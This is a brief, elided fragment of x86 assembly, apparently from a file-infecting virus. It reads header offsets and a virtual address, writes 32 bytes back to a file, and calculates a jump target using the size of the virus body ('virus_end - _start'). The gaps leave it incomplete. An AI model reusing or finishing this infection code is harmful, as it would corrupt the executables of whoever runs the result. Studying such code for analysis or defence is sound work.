...
getpos:
	...
	sub 	edx, STK_RES
	add 	edx, 52
	mov 	dword eax,[edx + 4]		;move offset to eax
	mov 	ebx, [esp - 4]
	...
	mov 	ecx, ebp
	sub 	ecx, 148
	write 	[fd], ecx, 32	 ;write back to memory
	...
	sub 	ebx, STK_RES
	add 	ebx, 52
	mov 	dword edx, [ebx + 8]	; get vaddress
	mov 	eax, [ebx + 16]
	add 	eax, edx
	sub 	eax, virus_end - _start
	mov 	[ecx], eax
